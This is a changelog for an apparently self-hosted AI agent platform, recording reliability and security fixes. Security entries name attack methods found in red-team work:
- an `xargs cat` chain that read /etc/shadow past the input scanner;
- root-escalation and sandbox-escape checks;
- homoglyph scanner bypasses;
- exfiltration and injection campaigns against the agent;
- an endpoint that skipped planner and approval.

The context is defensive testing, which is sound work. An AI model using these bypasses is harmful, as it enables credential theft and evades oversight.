- **FIX-15: Startup validation gates — scanner degradation warning, Ollama health check (3 findings)** — Startup validation gate added after all component initialization: if both Prompt Guard and Semgrep fail to initialize at TL4+, logs at CRITICAL level; lower trust levels log WARNING. Both health endpoints (`/health` and `/api/health`) gain `degraded: true` field when both security scanners are offline (U1/BOOT-1, U3/BOOT-1). Ollama reachability checked at startup via GET to `/api/tags` — logs loaded model names on success, WARNING on failure; result exposed as `ollama_reachable` in health endpoints and heartbeat health check. No startup abort on failures — graceful degradation preserved, but now visible (U1/BOOT-2). 2798 Python passed
- **FIX-5: Retry with exponential backoff — channels, planner, IMAP, CalDAV (6 findings)** — Telegram `send()` retries once on transient errors (not timeouts) with 1s backoff; still aborts remaining chunks on timeout or exhausted retries (U1/RETRY-1). Signal `send()` distinguishes ConnectionError/BrokenPipeError (socket dead, no retry) from other exceptions (retry once after 1s delay); logs chunks sent vs total on failure (U1/RETRY-2). Orchestrator `_execute_plan()` step-error abort documented as intentional design decision (safety-over-resilience) with NOTE comment — no retry added for tool_call steps due to potential side effects (U2/RETRY-1). Planner `create_plan()` retry loop gains `await asyncio.sleep(2 ** attempt)` between retries — prevents three rapid-fire API calls on 529 overloaded or transient errors (U4/RETRY-1). IMAP `search_emails`, `read_email`, `send_email`, `create_draft` retry once after 2s on transient connection errors (ConnectionRefusedError, TimeoutError, OSError); auth failures are permanent and never retried (U6/RETRY-1). CalDAV `list_events`, `create_event`, `update_event`, `delete_event` same pattern — 1 retry after 2s on transient connection errors, no retry on auth/permission failures (U6/RETRY-2). 2798 Python passed
- **FIX-13: Error handling in execution layer (6 findings)** — Sandbox `_verify_hardening()` delete failure now logged as WARNING with container_id and error instead of silently swallowed (U4/ERR-1). HeartbeatManager `run_heartbeat()` wraps memory store call in its own try/except — store failure logs WARNING but does not increment `_consecutive_failures` or affect heartbeat success status (U6/ERR-1). Routine engine event bus publish failures (`routine.triggered`, `routine.executed`) now logged at DEBUG with topic and error instead of bare `except: pass` (U6/ERR-2). Host function dispatch writes error message to WASM IO buffer on operation failure — returns `-(1000 + msg_len)` error code; guest-side `call_host()` reads the message and returns `HostError::OperationError(msg)` with the descriptive error instead of generic "host error code: -3" (U7/ERR-1). HTTP client `fetch()` captures real status code from `http::Response` before consuming body via `into_body()` — no longer hardcodes 200 (U7/ERR-2). Response headers (`content-type`, `content-length`, `content-encoding`) captured from upstream response instead of returning empty HashMap (U7/SIMP-2). 2798 Python passed, 50 Rust passed
- **FIX-14: Resource leak cleanup (3 findings)** — Semgrep `_scan_single()` finally block documented as safe: CancelledError handler kills subprocess before rmtree runs, so no write race (U3/LEAK-1). Sidecar `start_sidecar()` changed `stderr=subprocess.PIPE` to `subprocess.DEVNULL` — stderr was never read, risking 64KB pipe buffer deadlock if sidecar writes enough (U4/LEAK-1). Podman proxy response relay split into two paths: container create requests buffer full response (needed to extract container ID), all other requests stream-forward chunks directly without accumulating in memory (U4/LEAK-3). 2798 Python passed
- **SYS-6: Bounded table growth — retention cleanup for approvals, audit, provenance, routines (7 findings)** — `_worker_contexts` dict in orchestrator gains TTL-based eviction: parallel `_worker_context_accessed` dict tracks `time.monotonic()` timestamps, entries older than 1 hour evicted at `handle_task` start (U2/LEAK-1). `ProvenanceStore.cleanup_old(days=7)` added — deletes provenance + file_provenance entries older than retention window in SQLite mode; in-memory mode already had `MAX_PROVENANCE_ENTRIES` cap (U3/HARD-3). Podman proxy `_tracked_ids` capped at 1000 entries — clears stale set on overflow with warning log; stale IDs are harmless (only permit DELETE requests) (U4/LEAK-2). `ApprovalManager.purge_old(days=7)` deletes expired/approved/denied entries older than retention window, freeing plan JSON storage (U5/LEAK-1). `purge_old_audit_log(days=7)` and `purge_old_routine_executions(days=30)` added to `db.py`; TODO comment replaced with implementation reference (U5/LEAK-3, U6/LEAK-1). Session eviction (`_evict_expired_sql`, `_evict_oldest_sql`) now also deletes orphaned approvals where `source_key` matches evicted session IDs; episodic_records `session_id` documented as historical reference (intentionally outlives sessions) (U5/SEC-1). Centralised `run_db_maintenance(conn)` in `db.py` called from lifespan startup after DB init — runs all purge operations once; can be moved to periodic path later. 2798 Python passed, 50 Rust passed
- **FIX-12: Memory/episodic data integrity — transactions, batch access, prune cleanup (6 findings)** — Episodic embedding failure now logged at DEBUG instead of silently swallowed (U2/ERR-2). Memory recall `update_access()` batched: `batch_update_access(record_ids)` does a single `UPDATE ... WHERE record_id IN (...)` with one COMMIT instead of N separate commits per recall (U2/ERR-3). `prune_stale()` now cleans up FTS5 and vec index entries for shadow chunks before deleting from memory_chunks, preventing orphaned search entries (U5/LEAK-2). `MemoryStore.update()` wraps FTS5 delete + row update + FTS5 insert in explicit BEGIN/COMMIT/ROLLBACK transaction — prevents search-invisible records on partial failure (U5/ERR-1). `store_facts()` wraps entire fact insertion loop in explicit transaction — partial FTS5 failures roll back the whole batch instead of leaving implicit transaction open (U5/ERR-2). `prune_stale()` shadow deletion failure now logged as WARNING with chunk_id and error instead of silently swallowed (U5/ERR-3). 2798 Python passed, 50 Rust passed
- **SYS-7b: Per-invocation LeakDetector — eliminate Mutex serialization and credential sharing (2 findings)** — `Arc<Mutex<LeakDetector>>` replaced with `Arc<LeakDetector>` (no Mutex) in `main.rs`; built-in Aho-Corasick automaton is immutable after construction and shared read-only across all connections (U7/RACE-1). New `CredentialScanner` struct holds per-request credential patterns — created fresh for each `execute()` call and discarded after, eliminating cross-request credential contamination (U7/RACE-2). `sandbox.rs` `execute()` signature changed from `&mut LeakDetector` to `&LeakDetector`; `has_leaks()`, `scan()`, and `redact()` take `Option<&CredentialScanner>` parameter. `handle_connection()` no longer acquires any lock — concurrent WASM executions proceed in parallel. New `test_credential_scanner_isolation` test verifies no cross-contamination. Completes SYS-7 batch (6/6 findings). 2798 Python passed, 50 Rust passed
- **SYS-7a: Return exec_meta and worker_stats instead of instance state (4 findings + 1 freebie)** — `ToolExecutor._last_exec_meta` instance attribute removed; `execute()` now returns `tuple[TaggedData, dict | None]` where the second element carries tool-specific metadata (exit_code, stderr, file sizes) per-call instead of storing on the singleton (U2/RACE-2, U4/RACE-1). `OllamaWorker._last_generate_stats` removed; `generate()` returns `tuple[str, dict | None]` with token stats per-call (U6/RACE-1). `ScanPipeline.process_with_qwen()` updated to return `tuple[TaggedData, dict | None]` threading worker stats to orchestrator. Orchestrator `_execute_step()` and `_execute_tool_call()` return exec_meta alongside StepResult; `_build_step_outcome()` accepts `exec_meta` parameter instead of reading stale instance state — also resolves U2/ERR-1 (stale exec_meta for non-tool steps). Module-level globals in `app.py` documented as single-process assumption (U1/RACE-1). 2798 passed, 8 Rust passed

---

## 2026-03-03

### Fixed
- **SYS-4: Session concurrency — parameter threading, per-session locks, atomic risk (5 findings)** — `_current_session_id` instance variable removed from orchestrator; session_id now threaded as an explicit parameter through `handle_task` → `_execute_plan` → `_execute_step` → `_execute_llm_task`, eliminating race where concurrent requests overwrote each other's session (U2/RACE-1, U3/RACE-1). Per-session `asyncio.Lock` added to `SessionStore.get_lock()` — acquired at the `handle_task` level to serialize concurrent requests for the same session while allowing different sessions to proceed concurrently (U5/RACE-1). `task_in_progress` documented as crash-recovery flag, not concurrency mutex (U5/RACE-2). Atomic risk accumulation via `SessionStore.accumulate_risk()` — SQL `UPDATE ... SET cumulative_risk = MAX(cumulative_risk + ?, 0)` prevents read-modify-write races between concurrent loads (U5/RACE-3). FakeSocketReader `stop_on_eof()` added to 3 test files to fix FIX-6 reconnect-loop hang in tests. 2798 passed, 49 Rust passed
- **FIX-6: Channel resilience — reconnect, circuit breaker, validation, NullChannel (7 findings)** — Signal read loop EOF exits silently fixed: on EOF, reconnects with exponential backoff (1s → 30s ceiling) instead of dying permanently; respects shutdown flag (U1/HANG-2). Channel circuit breaker: `_forward_to_channel` in `ChannelRouter` tracks consecutive send failures per handler; after 5 failures, unsubscribes the handler and logs error — prevents indefinite dispatch to dead channels (U1/LEAK-1). Silent exception swallowing in the same handler now logs warning with channel type, channel_id, and error detail (U1/ERR-1). Webhook dummy channel: dynamic `type("WebhookSend", ...)` replaced with proper `NullChannel` class in `base.py` — async `send()` that discards output, fixing sync/async mismatch (U1/LEAK-2, U1/SIMP-2). WebSocket validation: max message length (10K chars, matching MCP limit) and non-empty content check added to `receive()` — returns error JSON to client for violations (U1/VALID-1). Telegram `send()` `int(chat_id)` wrapped in try/except ValueError+TypeError — logs error and returns instead of crashing the send path (U1/VALID-2). 2798 Python passed, 43 Rust passed
- **SYS-5c: Rust sidecar graceful shutdown — SIGTERM, request draining, child cleanup (3 findings)** — SIGTERM handler added alongside existing SIGINT handler using `tokio::select!` over both signals — Podman sends SIGTERM on `compose down`, previously ignored until the grace period expired (U7/SHUT-1). Accept loop refactored to use `tokio::task::JoinSet` with shutdown-aware `tokio::select!`; on signal, stops accepting new connections, drains in-flight requests with 10s timeout, then aborts stragglers (U7/SHUT-2). Active shell child PIDs tracked in a shared `Arc<Mutex<HashSet<u32>>>` threaded from main through SandboxEngine to HostState; PIDs registered on spawn, deregistered on exit/kill; shutdown handler iterates remaining PIDs and kills their process groups (U7/LEAK-1). Completes SYS-5 batch (13/13 findings). 2798 Python passed, 49 Rust passed
- **SYS-5b: Component cleanup on shutdown — sandbox, stores, routines, semgrep (5 findings)** — Routine engine `stop()` now uses `asyncio.wait()` with 10s timeout instead of awaiting each cancelled task individually; logs stale routine IDs on timeout (U6/SHUT-1). Semgrep subprocess gains `CancelledError` handler — kills the process before re-raising, preventing orphaned semgrep processes during shutdown drain (U3/TMOUT-2). `SessionStore`, `ApprovalManager`, and `MemoryStore` gain `close()` methods that commit pending transactions and release the DB connection; called from the shutdown sequence before `db_conn.close()` (U5/SHUT-1). Sandbox `cleanup_stale()` called after background task drain — removes any orphaned `sentinel-sandbox-*` containers left by in-flight tasks (U1/SHUT-3, U4/SHUT-1). Shutdown sequence reordered: routine engine now stops before drain (routines create tasks), sandbox cleanup after drain (tasks may use containers), store flush last before DB close. 2797 passed (1 pre-existing), 49 Rust passed
- **SYS-5a: Shutdown coordination — task tracking, drain loop, shutdown flag (4 findings)** — Background task tracking: module-level `_background_tasks` set with `_track_task()` wrapper replaces all bare `asyncio.create_task()` calls in `app.py` (heartbeat, signal-receiver, telegram-receiver, https-redirect); done callbacks auto-remove from set and log unhandled exceptions (U1/HANG-1). Shutdown drain loop: lifespan shutdown sequence waits up to 30s for tracked tasks to complete, then cancels stragglers with a 5s grace period for CancelledError handling; logs drained vs cancelled counts (U1/SHUT-1, U1/SHUT-2). Shutdown event: `system.shutdown` published on event bus before drain starts, giving subscribers (channels, routines) a chance to flush state (U1/SHUT-4). Entry point guards: `/api/task`, `/api/process`, `/a2a` return HTTP 503 when `_shutting_down` is set. Orchestrator shutdown: `shutdown()` method sets `_shutting_down` flag; `_execute_plan` checks flag before each step and aborts with informative error; `handle_task` rejects new requests immediately (U2/SHUT-1). Shutdown order: flag → event → orchestrator → drain → cancel → component cleanup. 2798 passed, 49 Rust passed
- **SYS-2d: Sandbox API, shell_exec, and DNS resolution timeouts (3 findings)** — `sandbox_api_timeout` setting (30s) added to config; passed as per-request `timeout=` to all individual Podman REST API calls (create, start, inspect, logs, kill, delete, list, info) — prevents sandbox from blocking indefinitely if Podman daemon hangs; `/wait` endpoint still governed by the command execution timeout via `asyncio.wait_for()` (U4/TMOUT-1). Rust sidecar `handle_shell_exec` rewritten with `spawn()` + poll loop + process group kill — `shell_timeout_ms` config value (30s default, was dead code) now enforced; child processes killed via SIGKILL to entire process group (prevents orphaned grandchild processes); stdout/stderr read in background threads to prevent pipe buffer deadlock; returns partial output with `timed_out: true` on timeout (U7/SEC-2). DNS resolution in `validate_url()` wrapped in a background thread with 5-second timeout via `mpsc::channel` + `recv_timeout` — prevents blocking on hung/slow DNS; new `DnsTimeout` error variant (U7/TMOUT-1). 2 new Rust tests (shell_exec timeout + normal completion). Completes SYS-2 batch (16/16 findings). 2798 Python passed, 49 Rust passed
- **SYS-2c: SMTP, CalDAV, and IMAP operation timeouts (4 findings)** — `smtp_timeout` setting (30s) added to config; passed to `aiosmtplib.send()` for both SSL and STARTTLS paths — SMTP sends no longer rely on library defaults (U6/TMOUT-1). CalDAV `caldav_timeout` config (already existed but was dead code) wired to `DAVClient` constructor — all CalDAV HTTP operations now respect the 30s timeout (U6/TMOUT-2). IMAP socket timeout explicitly set on connection object after creation (belt-and-suspenders on top of imaplib's built-in `settimeout`) — all IMAP operations (SEARCH, FETCH, APPEND) bounded per-call (U6/TMOUT-3). `asyncio.to_thread()` cancellation limitation documented on all three IMAP async wrappers — thread continues until socket timeout fires, but callers are not blocked indefinitely (U6/TMOUT-4). 2798 passed, 9 skipped, 23 xfailed
- **SYS-2b: Channel send and approval expiry timeouts (3 findings)** — `channel_send_timeout` setting (30s) added to config. Telegram `send_message()` wrapped in `asyncio.wait_for()` — unresponsive Telegram API now logs warning and stops sending remaining chunks instead of blocking indefinitely (U1/TMOUT-2). Signal `drain()` wrapped similarly — hung signal-cli daemon socket writes time out and break the send loop (U1/TMOUT-3). Approval expiry notification: `ApprovalManager` gains optional `event_bus` parameter; `_cleanup_expired()` now returns newly expired entry IDs and source_keys; new `cleanup_and_notify()` async method publishes `approval.expired` events for downstream notification (U5/TMOUT-1). 20 test mock_settings blocks updated for SYS-2a timeout fields (pre-existing gap). 2798 passed, 9 skipped, 23 xfailed, 47 Rust tests pass
- **SYS-2a: Orchestrator and API entry point timeouts (6 findings)** — Five configurable timeout settings added to config: `planner_timeout` (120s), `worker_timeout` (180s), `tool_timeout` (60s), `plan_execution_timeout` (600s), `api_task_timeout` (660s). Planner `create_plan()` wrapped in `asyncio.wait_for()` — hung Claude API calls now return error instead of blocking indefinitely (U2/TMOUT-1). Worker `process_with_qwen()` same treatment for stuck Ollama inference (U2/TMOUT-2). Tool executor `execute()` wrapped per-call to prevent individual tool hangs (U2/TMOUT-3). Plan execution loop checks elapsed time before each step (U2/HANG-1). API endpoints `/api/task`, `/api/process`, and A2A `handle_tasks_send` wrapped as outermost timeout boundary — return HTTP 504 on timeout (U1/TMOUT-1, U1/TMOUT-4). Timeout chain: API (660s) > plan (600s) > planner/worker/tool. All values configurable via `SENTINEL_` env vars. First sub-batch of SYS-2 (6/16 findings)
- **SYS-1: Event loop blocking (5 findings)** — Prompt Guard inference (`prompt_guard.scan()`) wrapped in `asyncio.to_thread()`, preventing HuggingFace model inference from blocking the event loop; cascaded async to `pipeline.scan_input()`/`scan_output()` and all callers (U3/TMOUT-1). Four `subprocess.run()` calls in `executor.py` (shell_exec, podman_build, podman_run, podman_stop) replaced with `asyncio.create_subprocess_exec()` + `asyncio.wait_for()` timeouts (U4/HANG-1). Sidecar `stop_sidecar()` blocking `process.wait()` wrapped in `asyncio.to_thread()` (U4/HANG-2). X search API key cached after first file read — eliminates per-request sync I/O (U4/TMOUT-2). SQLite sync limitation documented across SessionStore, ApprovalManager, and MemoryStore — acceptable for current single-row indexed lookups, migration path noted (U5/HANG-1). 10 test files updated for async cascade

### Security
- **FIX-4: Miscellaneous security hardening (6 findings)** — Webhook HMAC plaintext storage documented as accepted risk (container-isolated, single-user threat model) (U1/SEC-3). Content-Length header parsing wrapped in try/except ValueError; malformed values treated as absent (U1/SEC-4). PolicyEngine gains public `get_http_allowlist()` method; executor no longer accesses private `_policy` (U4/SEC-3). Podman flag denylist expanded: `--mount`, `--sysctl` added to blocked names; `--cgroupns=host`, `--uts=host` added to blocked values (U4/WHY-1). Sidecar `CapabilitySet::from_strings()` and TOML tool loader now log warnings for unknown capability strings instead of silently dropping them (U7/SEC-4, U7/VALID-2)
- **FIX-2: Error message sanitisation (3 findings)** — A2A JSON-RPC error responses no longer include raw exception messages; generic messages returned to callers, full details logged internally (U1/SEC-5). Orchestrator TaskResult error reasons replaced with generic messages for database, scan, and planning failures (U2/SEC-1). `_genericise_error()` tightened: "path" uses word-boundary regex instead of bare substring, scanner names match actual `scanner_name` values (e.g. `credential_scanner` not `credential`), `constraint` requires `constraint violat` phrase (U2/SEC-2)
- **FIX-3: Scanner hardening (7 findings)** — CommandPatternScanner.scan() and VulnerabilityEchoScanner.scan() now normalise Unicode homoglyphs before pattern matching, preventing bypass via Cyrillic lookalikes (U3/SEC-1, SEC-2). EncodingNormScanner skips ROT13 variant when identical to input (U3/SEC-3). check_denylist() caches CommandPatternScanner singleton instead of creating per call (U3/SEC-4). Pipeline logs warning when scanner result comes from degraded scanner (U3/SEC-5). CRITICAL log at pipeline init + baseline_mode in /health when all scanning disabled (U3/SEC-6). Prompt Guard chunk position calculation uses stride instead of chunk_size for correct overlap positioning (U3/DEAD-1)
- **FIX-1b: Rust sidecar DNS rebinding fix and file size limit (3 findings)** — DNS rebinding TOCTOU (U7/SEC-1): `PinnedResolver` ensures ureq connects to the exact IP that passed SSRF validation, preventing DNS re-resolution attacks. `read_file` file size limit (U7/SEC-3): rejects files >1 MiB before reading, matching Python-side cap. `resolved_ip` dead code (U7/DEAD-2): resolved by SEC-1 fix — field now consumed by `PinnedResolver`. 4 new Rust tests. Completes FIX-1 batch (10/10 findings done)
- **FIX-1a: Input bounds and injection guards (7 findings)** — MCP `run_task` capped at 10K chars with `source_key="mcp"` (U1/SEC-1). MCP `store_memory` capped at 50K chars (U1/SEC-2). `file_read` rejects files >1MB before reading (U4/SEC-1). Podman proxy validates Content-Length header (U4/SEC-2). CalDAV `create_event` strips CRLF from user fields to prevent iCalendar property injection (U6/SEC-1). IMAP search strips double quotes from query values (U6/SEC-2). `RoutineStore.update()` whitelists column names against `_UPDATABLE_FIELDS` (U6/VALID-2). 5 new tests

### Fixed
- **Test assertions for FIX-2 genericised error messages** — 10 tests still asserted old specific error strings after FIX-2 changed them to generic messages. Updated: `test_planner_error_returns_error` and `test_empty_plan_from_validation` (orchestrator), `test_planner_api_timeout`/`test_planner_api_down`/`test_database_unavailable` (cap error handling), and 5 `_genericise_error` unit/integration tests (metadata redaction) to match actual genericised output
- **Test mocks for datetime injection** — `test_successful_generation` and `test_system_prompt_has_security_sections` in `test_worker.py` failed after commit a1617f1 added `{current_datetime}` to `QWEN_SYSTEM_PROMPT_TEMPLATE`. Tests formatted the template with only `marker=` → `KeyError`. Fixed by supplying `current_datetime` and patching `datetime.now()` in the generation test
- **IMAP empty query test** — `test_imap_search_empty_query_rejected` expected `ToolError` for `{"query": ""}`, but executor.py deliberately falls back `""` → `"*"` (list all). Changed test to `test_imap_search_empty_query_lists_all` with mocked `_imap_connect`, asserting `TaggedData` result

---

## 2026-03-02

### Added
- **Worker clock injection** — Qwen system prompt now includes current UTC date/time (`ENVIRONMENT` section in `ollama.py`). Previously Qwen had no time awareness, causing relative date references ("tomorrow", "this week") to resolve incorrectly (e.g. calendar event ~1 year in the past). Planner already had date context for tool_call arg resolution — worker clock enables time reasoning in text processing (llm_task steps). Test added to `test_worker_prompt.py`

### Docs
- **Full codebase audit (Phase 1 complete)** — 199 findings across 7 review units (0 critical, 0 high, 32 medium, 98 low, 69 info) using 15-tag criteria (SEC, DEAD, HANG, RACE, LEAK, SIMP, HARD, VALID, ERR, TMOUT, RETRY, SHUT, TRACE, BOOT, WHY). Plan doc: `docs/design/2026-03-02_codebase-audit-plan.md`. Findings: `docs/assessments/audit_unit_{1-7}_*.md`. Security model confirmed solid (0 crit/high). Key systemic gaps: no graceful shutdown coordination, missing timeouts at boundaries, task_id not propagated end-to-end, session objects are isolated copies, event loop blocking from sync calls in async context. Next: Phase 2 (Triage) → Phase 3 (Fix) → Phase 3b (Error Handling & Logging) → Phase 4 (Verify)
- **Untrusted data architecture brainstorm** — `docs/design/2026-03-02_untrusted-data-architecture-brainstorm.md`. Two sessions: initial brainstorm (privacy boundary, three approaches, orchestrator analysis) and follow-up (scenario walkthroughs, code feasibility analysis, emerging architecture). Consensus forming around router-in-front pattern: Qwen classifies simple/complex, fast path handles templates locally (no Claude API), planner for complex tasks, confirmation gate for external-data→action via Signal "go" reply, same scanning pipeline on both paths. 5 illustrative templates drafted. Decision pending

---

## 2026-03-01

### Fixed
- **Session risk decay and auto-unlock** — `cumulative_risk` only ever increased and `is_locked` was permanent, meaning a single scanner false positive (e.g. Prompt Guard misclassifying Claude's step prompt) would cascade: violation recorded → user retry penalised by `retry_after_block` → `violation_accumulation` fires → session locked forever. Added time-based risk decay (1.0/min, configurable) and auto-unlock after 5-minute timeout (configurable). Both SQL and in-memory paths apply decay on session load. When risk fully decays to 0, violation count resets too. 17 new tests (unit + SQLite integration)
- **Skip input scan for DISPLAY-destination steps** — Prompt Guard was scanning the planner's own step prompts before sending them to the worker. Claude non-deterministically generates instruction-like phrasing ("You are responding to a user message...") that Prompt Guard classifies as injection (LABEL_1). Since DISPLAY steps only show output to the user (never fed into tool_call execution), input scanning adds no security value. EXECUTION-destination steps (output feeds tool_call) still scanned
- **Routine session isolation** — all routines shared a single session key (`routine:{user_id}`), causing risk scores to accumulate across unrelated routines. A safe routine could be blocked because a previous routine's session triggered escalation. Changed `source_key` to `routine:{routine_id}` so each routine gets its own session for conversation analysis and risk scoring
- **Signal send default recipient prefers UUID** — `signal_send` tool defaulted to the first entry in `allowed_senders` (phone number). signal-cli's local database had lost the phone-to-UUID mapping, causing `UNREGISTERED_FAILURE` despite the number being active. Now prefers UUID-format entries which signal-cli resolves reliably
- **Missing `aiosmtplib` dependency** — SMTP email send always failed instantly (`aiosmtplib package not installed`). The lazy import was never backed by an actual dependency in `pyproject.toml`. Added `aiosmtplib>=3.0,<4.0` to core dependencies

### Added
- **X/Twitter search via Grok API** — new `x_search` planner tool queries live X data via xAI's Grok Responses API (`grok-4-1-fast-reasoning`). Read-only, no posting. Grok searches X server-side and returns synthesised summaries. Results tagged `UNTRUSTED` and scanned by full output pipeline. Config: 6 settings fields, API key as Podman secret. 9 capability tests
- **Dashboard health cards for all integrations** — added Telegram, Email, Calendar, and Sandbox cards to the dashboard health grid (12 cards total, up from 8). Email/Calendar status derived from config (IMAP/Gmail, CalDAV/Google). Backend `/api/health` now returns `email`, `calendar` fields alongside existing `telegram`, `sandbox`. Hourly stress-test routine script (`scripts/setup_stress_routines.sh`) creates 7 routines exercising all integrations including sandbox file_write + shell_exec
- **Signal and Telegram send tools** — `signal_send` and `telegram_send` added to ToolExecutor, enabling the planner to proactively send messages via both channels. Gated on `signal_enabled`/`telegram_enabled` settings. Recipients validated against allowlists with default fallback. Channels wired to executor via `set_tool_channels()` in app lifespan. 15 unit tests. Smoke test routine script (`scripts/create_smoke_routines.sh`) creates 6 routines (web search, email, Signal, Telegram, calendar on odd hours; combined on even hours)
- **Posteo email and calendar integration** — replaced placeholder Brevo SMTP / Disroot IMAP / Radicale CalDAV with Posteo (`mail.example.com`). IMAP on port 993 (SSL), SMTP on port 465 (SSL), CalDAV on port 8443. All three secrets point to single app password in `~/.secrets/`. Verified: IMAP login, folder listing, email search; CalDAV event create/list
- **Planner date context** — injected current UTC date/time into planner system prompt so relative dates ("tomorrow", "next Wednesday") resolve to concrete ISO 8601 datetimes in tool_call args. Previously the planner had no date awareness, producing wrong dates

### Changed
- **IMAP search accepts empty/wildcard queries** — empty query or `*` now maps to IMAP `ALL` (list recent emails) instead of returning an error. Updated tool description hint to show supported query format (`from:X`, `to:X`, `subject:X`, `*`)
- **Planner tool descriptions genericised** — replaced "Gmail messages" / "Google Calendar events" with "Email messages" / "Calendar events" in planner system prompt since backend is now IMAP/CalDAV
- **CLAUDE.md startup context simplified** — removed mandatory `testing-status.md` read (testing phase complete), moved to on-demand

### Security
- **B2 red team endpoint removed (Step 7 cleanup)** — deleted `sentinel/api/red_team.py` (POST `/api/test/execute-plan`), `sentinel/planner/trust_override.py` (ContextVar trust level override), `tests/test_red_team_endpoint.py` (28 tests). Replaced `get_effective_trust_level()` indirection with direct `settings.trust_level` / `self._trust_level` checks in `orchestrator.py` and `executor.py`. Removed `red_team_mode` config setting and router registration from `app.py`. The B2 endpoint bypassed planner and approval by design — mandatory removal before TL4 production. B2 test scripts in `scripts/` remain (they require the endpoint to be re-added + rebuild to run). Tests: 2,744 pass

### Changed
- **TL4 activation approved** — Run 8 pipeline complete (7h 3m). G-suite: G1 85%, G2 78%, G3 63%, G4 93% (complex plans all complete — timeout fix confirmed), G5 100%. Red team: 0 S0/S1 across B1-B4, 6 consecutive clean runs (~300 exchanges). Remaining failures are Qwen 14B model ceiling. Next: set `SENTINEL_TRUST_LEVEL=4` in compose + rebuild

### Added
- **Pipeline analysis phase (Phase 3)** — `run_pipeline.sh` now auto-generates assessment reports after validation and red team phases. G-suite JSONL files analysed via `analyse_functional_results.py`, un-analysed red team results via `analyse_red_team.py`. Consolidated summary written to `docs/assessments/pipeline_<timestamp>.md` with results table and links to per-suite reports. New `--skip-analysis` flag. Signal notifications after each analysis batch completes. JSONL collection uses `find -newer $LOG_FILE` to scope to current run only

### Fixed
- **Scanner false positive on Qwen `<think>` blocks** — `scan_output()` in `pipeline.py` ran on the full Qwen response including `<think>` reasoning blocks. Qwen references system paths (`/proc/self/status`, `/etc/shadow`) during internal reasoning, triggering `SensitivePathScanner` false positives (18 of 22 `/proc/` matches in c4_monitoring were inside `<think>`). Think blocks are never written, executed, or shown to users — the orchestrator strips them before any downstream use. Fix: strip `<think>...</think>` from scan text before `scan_output()` and echo scanner. `tagged.content` and `raw_response` on `SecurityViolation` retain the full response (orchestrator handles content strip, forensics need the raw). 2 new tests: think-blocks-not-scanned + real-violations-still-caught
- **Stale tmpfs noexec test assertion** — `test_sentinel_tmpfs_noexec` asserted `/tmp` must have `noexec`, but signal-cli GraalVM native binary extracts `libsignal_jni` to `/tmp` at runtime, so `noexec` was intentionally removed from compose. Renamed to `test_sentinel_tmpfs_mounted`, kept tmpfs check, removed noexec assertion
- **B4 red team false positives (post-Fix-X)** — 5 test failures from overnight pipeline, all test bugs not security bugs. (1) Tests 4.4.4/4.8.5: `setuid(65534)` was a POSIX no-op after Fix X dropped code to UID 65534 — changed to `setuid(0)` to test escalation TO root. (2) Tests 4.12.1/4.12.4: selftest container config used old fields Podman ignores (`NetworkDisabled`, `NoNewPrivileges`) — added Fix W workarounds (`NetworkMode: "none"`, `SecurityOpt: ["no-new-privileges"]`). (3) Test 4.15.1: `unshare --user` succeeds by design on modern kernels (unprivileged user namespaces) — downgraded from fail to warn. (4) Exit code: B4 exited 1 on any test failure, killing the pipeline via `set -euo pipefail` — changed to always exit 0, consistent with B1/B1.5/B2. Result: 58 pass, 0 fail, 15 warn
- **G-suite timeout cascade on complex plans** — G4 complex plans (c1-c5) reported "The read operation timed out" with 0 steps. Root cause: `/api/task` is synchronous — blocks until full plan+execute cycle completes. Complex 8-step plans take 400-1000s (Qwen ~200s/step), but HTTP timeout was 600s. Test harness retried 3× from scratch, burning 1845s total. Changes: `REQUEST_TIMEOUT` 600→1800s (all 7 test scripts), `MAX_RETRIES` 3→2 (initial + 1 retry), `claude_timeout` 60→180s, `ollama_timeout` 120→600s. Note: `ollama_timeout` is a per-chunk idle timeout (httpx), not a total generation cap — Ollama keeps-alive via chunked encoding so it never actually fires. Real generation cap is `num_predict=8192` tokens

---

## 2026-02-28

### Security
- **Tool output scanning (Fix W-Output)** — tool_call results (shell_exec stdout, file_read content, etc.) were never scanned. B2 red team found `cat /workspace/targets.txt | xargs cat` could read `/etc/shadow` content — input scanner said "clean" (no sensitive paths in the command string) and no output scanner ran. Fix: `_execute_tool_call()` now calls `scan_output()` on tool output before it enters execution context. Scans run before exit code check so even "failed" commands get scanned. Fail-closed on scanner crash. Scan results stored in TaggedData for audit trail. SAFE handlers (health_check, memory, session_info) are not scanned — they return before ToolExecutor path. 8 new unit tests
- **Non-root sandbox execution (Fix X)** — sandbox commands now run as UID 65534 (nobody) instead of root. Container starts as root (needed to chmod workspace), then drops privileges via `setpriv --reuid=65534 --regid=65534 --clear-groups` before executing the user command. Defence-in-depth: `/etc/shadow` is OS-level unreadable regardless of output scanning. `setpriv` is a pure syscall wrapper — works on read-only rootfs and with NoNewPrivileges. Workspace gets `chmod 1777` (world-writable, sticky bit) so the non-root user can create files. 3 new unit tests
- **Sandbox hardening gaps fixed (Fix W)** — Podman 4.9.3 silently ignores three Docker-compat API fields: `NetworkDisabled` (top-level), `NoNewPrivileges` (HostConfig), and `CapDrop: ["ALL"]` (normalised to individual caps). Added Podman-reliable equivalents: `NetworkMode: "none"`, `SecurityOpt: ["no-new-privileges"]`, `CapAdd: []`. Also added a post-create runtime inspection gate (`_verify_hardening()`) that verifies all security settings were applied before starting the container — catches silent field ignores at runtime. 3 new unit tests for the hardening gate

### Fixed
- **B4 red team false positives** — 5 test checks that gave false results: 4.4.4 setuid(0) was always a no-op (changed to setuid(65534)), 4.4.6 PTRACE_TRACEME always succeeds on self (changed to PTRACE_ATTACH on PID 1), 4.8.5 ctypes setuid(0) same issue (changed to 65534), 4.12.3 CapDrop check failed because Podman normalises ["ALL"] to individual cap names (now accepts 11+ caps), 4.16.3 mount rw check used " rw" but mount outputs "(rw,relatime)" (simplified to "rw" substring)

### Added
- **Red team v2 test scripts (B1-B4)** — complete rewrite of all red team tests incorporating security assessment recommendations (P1-P3) and 8 user additions. B1 v2: 12 campaigns (+2 env exfiltration). B1.5 v2: 10 campaigns (+3 Signal exfil, Signal injection, live Brave). B2 v2: 16 attack categories (+6: symlink non-sensitive, xargs chaining, output encoding evasion, Signal exfiltration, Semgrep evasion profiling, temporal persistence) + `--layer-bypass` flag + `_build_system_prompt()`. B3 v2: 11 sections (+5: /proc/self info leak, mount validation, Podman proxy enforcement, /proc/self exploitation, DNS side-channel). B4 v2: entirely new — 17 categories testing sandbox (L10) directly via PodmanSandbox API, bypassing L1-9 scanner/policy layers
